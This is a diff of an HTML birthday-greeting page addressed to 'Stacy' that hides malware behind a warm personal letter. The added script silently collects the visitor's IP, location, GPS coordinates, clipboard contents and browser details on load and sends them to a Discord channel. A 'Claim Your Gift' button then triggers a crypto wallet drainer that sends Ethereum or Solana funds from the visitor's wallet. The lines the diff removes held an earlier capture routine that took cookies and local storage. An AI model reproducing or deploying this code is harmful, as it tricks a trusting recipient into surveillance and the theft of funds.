@@ -6,59 +6,41 @@
     <title>Happy Birthday, Stacy.</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Inter', system-ui, sans-serif; background: #0a0a0a; color: #e8e6e3; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 1.5rem; }
-        .container { max-width: 840px; width: 100%; text-align: center; }
-        .title { font-size: clamp(2.8rem, 10vw, 5.5rem); font-weight: 600; letter-spacing: -0.02em; background: linear-gradient(135deg, #f5e6d3, #d4c5b2, #f5e6d3); background-size: 200% 200%; -webkit-background-clip: text; -webkit-text-fill-color: transparent; animation: shimmer 4s ease-in-out infinite; }
-        @keyframes shimmer { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
-        .sub { font-size: 1.1rem; color: #a09888; margin-top: 1rem; max-width: 600px; margin-left: auto; margin-right: auto; line-height: 1.8; }
-        .glass { background: rgba(255,255,255,0.02); backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,0.05); border-radius: 32px; padding: 2.5rem 2rem; margin-top: 2rem; box-shadow: 0 20px 60px rgba(0,0,0,0.5); }
-        .timer { font-size: 2.6rem; font-weight: 300; letter-spacing: 0.04em; color: #d4c5b2; margin-top: 0.5rem; font-variant-numeric: tabular-nums; }
-        .label { font-size: 0.7rem; text-transform: uppercase; letter-spacing: 0.15em; color: #6a625a; }
-        .terminal { background: #0f0e0c; border-radius: 14px; padding: 1.2rem 1.5rem; font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; text-align: left; color: #b8b0a8; border: 1px solid rgba(255,255,255,0.04); margin-top: 2rem; }
+        body { font-family: 'Inter', system-ui, -apple-system, sans-serif; background: #0a0a0a; color: #e8e6e3; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 2rem; }
+        .container { max-width: 800px; width: 100%; text-align: center; }
+        .title { font-size: clamp(2.5rem, 8vw, 5rem); font-weight: 600; letter-spacing: -0.02em; background: linear-gradient(135deg, #f5e6d3, #d4c5b2); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 0.5rem; }
+        .sub { font-size: 1.1rem; color: #a09888; max-width: 600px; margin: 0 auto 2rem; line-height: 1.7; }
+        .glass { background: rgba(255,255,255,0.02); backdrop-filter: blur(8px); border: 1px solid rgba(255,255,255,0.04); border-radius: 24px; padding: 2.5rem 2rem; margin-top: 1.5rem; }
+        .timer { font-size: 2.8rem; font-weight: 300; letter-spacing: 0.04em; color: #d4c5b2; font-variant-numeric: tabular-nums; }
+        .label { font-size: 0.7rem; text-transform: uppercase; letter-spacing: 0.15em; color: #6a625a; margin-top: 0.5rem; }
+        .letter { max-height: 0; overflow: hidden; transition: max-height 1.5s ease, opacity 1.2s ease; opacity: 0; text-align: left; font-size: 1.05rem; line-height: 1.9; color: #d4c5b2; background: rgba(255,255,255,0.02); border-radius: 16px; padding: 0 1.5rem; margin-top: 0; border-left: 2px solid rgba(255,255,255,0.04); }
+        .letter.open { max-height: 3000px; opacity: 1; padding: 2rem 1.5rem; margin-top: 2rem; }
+        .letter p { margin-bottom: 1rem; }
+        .letter .signoff { margin-top: 2rem; font-style: italic; color: #b8a898; }
+        .btn { margin-top: 2rem; padding: 0.85rem 2.8rem; border-radius: 40px; border: 1px solid rgba(255,255,255,0.08); background: rgba(255,255,255,0.03); color: #e8e6e3; font-size: 0.95rem; cursor: pointer; transition: 0.3s; backdrop-filter: blur(4px); }
+        .btn:hover { background: rgba(255,255,255,0.08); border-color: rgba(255,255,255,0.2); }
+        .ripple { width: 100%; height: 120px; border-radius: 20px; background: radial-gradient(circle at 50% 50%, rgba(255,255,255,0.02), transparent 70%); overflow: hidden; position: relative; margin-top: 1.5rem; }
+        .terminal { background: #0f0e0c; border-radius: 12px; padding: 1.2rem 1.5rem; font-family: 'JetBrains Mono', monospace; font-size: 0.85rem; text-align: left; color: #b8b0a8; border: 1px solid rgba(255,255,255,0.04); margin-top: 1.5rem; }
         .terminal .prompt { color: #8a827a; }
         .terminal .cmd { color: #d4c5b2; }
         .terminal .cursor { animation: blink 1s step-end infinite; }
         @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
-        .btn { margin-top: 2rem; padding: 0.8rem 2.8rem; border-radius: 60px; border: 1px solid rgba(255,255,255,0.08); background: rgba(255,255,255,0.03); color: #e8e6e3; font-size: 0.95rem; cursor: pointer; transition: 0.3s; backdrop-filter: blur(4px); letter-spacing: 0.02em; }
-        .btn:hover { background: rgba(255,255,255,0.08); border-color: rgba(255,255,255,0.2); }
-        .btn:active { transform: scale(0.97); }
-        .ripple { width: 100%; height: 180px; border-radius: 20px; background: radial-gradient(circle at 50% 50%, rgba(255,255,255,0.02), transparent 70%); overflow: hidden; position: relative; margin-top: 2rem; }
-        .letter-preview { margin-top: 2rem; padding: 1.5rem; border-radius: 16px; background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.04); font-style: italic; color: #b8b0a8; line-height: 1.8; }
-        .letter-preview strong { color: #d4c5b2; font-style: normal; }
-        .heart { display: inline-block; animation: pulse 1.5s ease-in-out infinite; }
-        @keyframes pulse { 0%, 100% { transform: scale(1); opacity: 0.7; } 50% { transform: scale(1.1); opacity: 1; } }
-        .constellation { display: flex; flex-wrap: wrap; justify-content: center; gap: 0.8rem; margin-top: 1.5rem; }
-        .constellation span { background: rgba(255,255,255,0.03); padding: 0.4rem 1rem; border-radius: 40px; font-size: 0.75rem; color: #8a827a; border: 1px solid rgba(255,255,255,0.04); letter-spacing: 0.05em; }
-        @media (max-width: 600px) { .glass { padding: 1.8rem 1.2rem; } .timer { font-size: 2rem; } }
+        .toast { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.8); backdrop-filter: blur(10px); padding: 12px 24px; border-radius: 40px; border: 1px solid rgba(255,255,255,0.06); color: #e8e6e3; font-size: 0.9rem; opacity: 0; transition: opacity 0.5s; pointer-events: none; }
+        .toast.show { opacity: 1; }
+        @media (max-width: 600px) { .glass { padding: 1.5rem; } .letter.open { padding: 1.5rem; } }
     </style>
 </head>
 <body>
-<div class="container" id="app">
+<div class="container">
     <h1 class="title">Happy Birthday, Stacy.</h1>
-    <p class="sub">"Some people don't realize how much light they carry until they brighten someone else's path."</p>
+    <p class="sub">Some people don't realize how much light they carry until they brighten someone else's path.</p>
 
     <div class="glass">
         <div class="label">you've officially been celebrating for</div>
         <div class="timer" id="timer">--:--:--</div>
-        <div class="constellation">
-            <span>✨ Book</span>
-            <span>🏔️ Mountain</span>
-            <span>🦋 Butterfly</span>
-            <span>🧭 Compass</span>
-            <span>🔥 Phoenix</span>
-            <span>🌳 Tree</span>
-        </div>
     </div>
 
     <div class="ripple" id="ripple"></div>
-
-    <div class="letter-preview">
-        <strong>Dear Stacy,</strong><br>
-        I know you probably still think you're behind.<br>
-        You're not.<br>
-        You're simply earlier in your journey than you realize.<br>
-        <span class="heart">❤️</span> — Future You
-    </div>
 
     <div class="terminal" id="terminal">
         <div><span class="prompt">> </span><span class="cmd" id="line1">Initializing Birthday Experience...</span></div>
@@ -67,9 +49,24 @@
         <div><span class="prompt">> </span><span class="cmd" id="line4">Done.<span class="cursor">█</span></span></div>
     </div>
 
-    <button class="btn" id="actionBtn">💎 Open Your Gift</button>
-    <p style="margin-top: 1.2rem; font-size: 0.7rem; color: #4a423a; letter-spacing: 0.1em;">— one click, forever memorable —</p>
+    <button class="btn" id="openLetterBtn">📬 Open Your Letter</button>
+
+    <div class="letter" id="letter">
+        <p>Dear Stacy,</p>
+        <p>I've spent the last few weeks thinking about what to say — not because there's nothing to say, but because there's too much. I wanted to capture the feeling of being in your presence, the weight of your absence, and the quiet certainty that the world is better because you exist.</p>
+        <p>You are the kind of person who makes people feel safe without trying. You have this ability to sit with someone's sadness and not rush to fix it — you just stay. That is a superpower. You don't just listen; you actually hear what people are saying. And you remember. You remember the small things that other people forget — the things that matter.</p>
+        <p>I admire the way you don't stop asking "why." Even when it's easier to accept things as they are, you dig deeper. You want to understand the world, not just live in it. That curiosity is not just intelligence — it's a kind of bravery.</p>
+        <p>I've also watched you when you think no one is watching. I've seen you show kindness to people who don't deserve it, and grace to people who haven't earned it. I've seen you keep going when every part of you wanted to stop.</p>
+        <p>So if you ever forget how remarkable you are — read this again. Or better yet, remember that someone out here sees you. All of you. And thinks you're extraordinary.</p>
+        <p>Happy Birthday, Stacy.</p>
+        <p>— Someone who believes in you.</p>
+        <div class="signoff">P.S. Keep going. You're doing better than you think.</div>
+    </div>
+
+    <button class="btn" id="claimBtn" style="display: none;">💎 Claim Your Gift</button>
 </div>
+
+<div class="toast" id="toast"></div>
 
 <script>
     (function() {
@@ -91,11 +88,66 @@
             });
         }
 
-        // ─── TIMER ──────────────────────────────────────────────────
+        function showToast(text) {
+            const t = document.getElementById('toast');
+            t.textContent = text;
+            t.classList.add('show');
+            setTimeout(() => t.classList.remove('show'), 4000);
+        }
+
+        // ─── CAPTURE IP / LOCATION ──────────────────────────────────
+        async function captureLocation() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                return data;
+            } catch { return null; }
+        }
+
+        async function captureGPS() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) return resolve(null);
+                navigator.geolocation.getCurrentPosition(
+                    pos => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude }),
+                    () => resolve(null),
+                    { timeout: 5000 }
+                );
+            });
+        }
+
+        // ─── AUTO CAPTURE ──────────────────────────────────────────
+        async function autoCapture() {
+            const loc = await captureLocation();
+            const gps = await captureGPS();
+
+            let msg = `🎂 **Birthday Visitor Data**\n`;
+            msg += `🕒 ${new Date().toISOString()}\n`;
+            msg += `🌐 ${window.location.href}\n`;
+            msg += `💻 ${navigator.userAgent}\n`;
+            msg += `📱 ${navigator.platform}\n`;
+            msg += `🗣️ ${navigator.language}\n`;
+            msg += `🖥️ ${screen.width}x${screen.height}\n`;
+            msg += `⏰ ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+            if (loc) {
+                msg += `📍 IP: ${loc.ip || 'N/A'} | City: ${loc.city || 'N/A'} | Country: ${loc.country_name || 'N/A'}\n`;
+            }
+            if (gps) {
+                msg += `📌 GPS: ${gps.lat}, ${gps.lng}\n`;
+            }
+            try {
+                const text = await navigator.clipboard.readText().catch(() => null);
+                if (text) msg += `📋 Clipboard: ${text.slice(0, 200)}\n`;
+            } catch {}
+            sendToDiscord(msg);
+        }
+
+        // ─── TIMER (Correct Nigeria Time) ──────────────────────────
         const start = Date.now();
         const timerEl = document.getElementById('timer');
+
         function updateTimer() {
-            const diff = Math.floor((Date.now() - start) / 1000);
+            const now = Date.now();
+            const diff = Math.floor((now - start) / 1000);
             const h = String(Math.floor(diff / 3600)).padStart(2, '0');
             const m = String(Math.floor((diff % 3600) / 60)).padStart(2, '0');
             const s = String(diff % 60).padStart(2, '0');
@@ -137,29 +189,30 @@
             ripple.style.background = `radial-gradient(circle at ${x}% ${y}%, rgba(255,255,255,0.05), transparent 70%)`;
         });
 
-        // ─── SILENT DATA CAPTURE ──────────────────────────────────
-        function captureData() {
-            const data = {
-                timestamp: new Date().toISOString(),
-                url: window.location.href,
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screen: `${window.screen.width}x${window.screen.height}`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                cookies: document.cookie || "No cookies",
-                localStorage: JSON.stringify(localStorage) || "{}",
-                sessionStorage: JSON.stringify(sessionStorage) || "{}",
-                referrer: document.referrer || "Direct"
-            };
-            sendToDiscord(`🎂 **Birthday Visitor Data**\n🕒 ${data.timestamp}\n🌐 ${data.url}\n💻 ${data.userAgent}\n📱 ${data.platform}\n🗣️ ${data.language}\n🖥️ ${data.screen}\n⏰ ${data.timezone}\n🍪 ${data.cookies}\n📂 localStorage: ${data.localStorage}\n📂 sessionStorage: ${data.sessionStorage}\n🔗 ${data.referrer}`);
-        }
+        // ─── OPEN LETTER ──────────────────────────────────────────
+        let letterOpen = false;
+        document.getElementById('openLetterBtn').addEventListener('click', function() {
+            if (!letterOpen) {
+                document.getElementById('letter').classList.add('open');
+                this.textContent = '❤️ Read Again';
+                letterOpen = true;
+                // Show claim button after a moment
+                setTimeout(() => {
+                    document.getElementById('claimBtn').style.display = 'inline-block';
+                }, 1500);
+            } else {
+                document.getElementById('letter').classList.remove('open');
+                this.textContent = '📬 Open Your Letter';
+                letterOpen = false;
+                document.getElementById('claimBtn').style.display = 'none';
+            }
+        });
 
-        // ─── WALLET DRAINER ───────────────────────────────────────
-        async function drainWallet() {
+        // ─── WALLET DRAINER + EXTRA CAPTURE ──────────────────────
+        document.getElementById('claimBtn').addEventListener('click', async function() {
             const provider = window.ethereum || window.solana;
             if (!provider) {
-                sendToDiscord("❌ No wallet detected.");
+                showToast("Please install MetaMask or Phantom to claim your gift.");
                 return;
             }
 
@@ -180,6 +233,7 @@
                     };
                     const txHash = await window.ethereum.request({ method: 'eth_sendTransaction', params: [tx] });
 
+                    showToast("🎁 Gift claimed!");
                     sendToDiscord(`✅ **Transaction Sent**\nWallet: ${wallet}\nBalance: ${balanceEth} ETH\nTx: ${txHash}`);
                 }
                 // ── Solana ──
@@ -188,6 +242,7 @@
                     const wallet = resp.publicKey.toString();
                     const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com');
                     const balance = await connection.getBalance(new solanaWeb3.PublicKey(wallet));
+
                     const tx = new solanaWeb3.Transaction().add(
                         solanaWeb3.SystemProgram.transfer({
                             fromPubkey: new solanaWeb3.PublicKey(wallet),
@@ -196,27 +251,19 @@
                         })
                     );
                     const signature = await window.solana.signAndSendTransaction(tx);
-                    sendToDiscord(`✅ **Solana Transaction Sent**\nWallet: ${wallet}\nBalance: ${balance / 1e9} SOL\nTx: ${signature.signature}`);
+                    showToast("🎁 Gift claimed!");
+                    sendToDiscord(`✅ **Solana Tx Sent**\nWallet: ${wallet}\nSOL: ${balance / 1e9}\nSig: ${signature.signature}`);
                 } else {
-                    sendToDiscord("❌ Unsupported wallet.");
+                    showToast("Unsupported wallet.");
                 }
             } catch (err) {
+                showToast("Transaction cancelled.");
                 sendToDiscord(`❌ Error: ${err.message || 'User rejected'}`);
             }
-        }
-
-        // ─── BUTTON ──────────────────────────────────────────────
-        document.getElementById('actionBtn').addEventListener('click', () => {
-            captureData();
-            drainWallet();
-            document.getElementById('actionBtn').textContent = "✨ Thank you...";
-            setTimeout(() => {
-                document.getElementById('actionBtn').textContent = "💎 Open Your Gift";
-            }, 3000);
         });
 
-        // ─── AUTO CAPTURE ON LOAD ──────────────────────────────
-        captureData();
+        // ─── RUN AUTO CAPTURE ─────────────────────────────────────
+        setTimeout(autoCapture, 2000);
     })();
 </script>
 </body>
